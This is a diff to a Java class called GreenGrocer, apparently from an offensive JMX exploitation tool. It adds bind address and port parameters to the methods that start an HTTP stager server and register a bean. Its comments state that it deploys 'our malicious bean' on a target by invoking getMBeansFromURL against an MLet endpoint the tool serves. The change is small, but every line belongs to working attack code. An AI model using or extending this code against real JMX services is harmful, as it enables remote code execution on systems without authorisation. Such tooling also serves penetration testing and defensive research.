@@ -206,7 +206,7 @@ public class GreenGrocer {
          }
     }
 
-    public void registerBean(String stagerHost, String stagerPort, boolean remoteStager)
+    public void registerBean(String bindAddress, String bindPort, String stagerHost, String stagerPort, boolean remoteStager)
     {
         try {
             /* If the malicious Bean is already registered, we are done */
@@ -233,7 +233,7 @@ public class GreenGrocer {
             /* The stager server might run on a different machine, in this case we can skip server creation */
             HttpServer payloadServer = null;
             if( ! remoteStager )
-                payloadServer = this.startStagerServer(stagerHost, stagerPort);
+                payloadServer = this.startStagerServer(bindAddress, bindPort, stagerHost, stagerPort);
 
             /* In any case we need to invoke getMBeansFromURL to deploy our malicious bean */
             Object res = this.mBeanServer.invoke(this.mLetName, "getMBeansFromURL",
@@ -376,7 +376,7 @@ public class GreenGrocer {
         }
     }
 
-    public HttpServer startStagerServer(String stagerHost, String stagerPort)
+    public HttpServer startStagerServer(String bindAddress, String bindPort, String stagerHost, String stagerPort)
     {
         HttpServer server = null;
         try {
@@ -389,8 +389,8 @@ public class GreenGrocer {
             }
 
             /* First we create a new HttpServer object */
-            server = HttpServer.create(new InetSocketAddress(stagerHost, Integer.valueOf(stagerPort)), 0);
-            System.out.println("[+] \tCreating HTTP server on " + stagerHost + ":" + stagerPort);
+            server = HttpServer.create(new InetSocketAddress(bindAddress, Integer.valueOf(bindPort)), 0);
+            System.out.println("[+] \tCreating HTTP server on " + bindAddress + ":" + bindPort);
 
             /* Then we register an MLetHandler for requests on the endpoint /mlet */
             System.out.print("[+] \t\tCreating MLetHandler for endpoint /mlet... ");
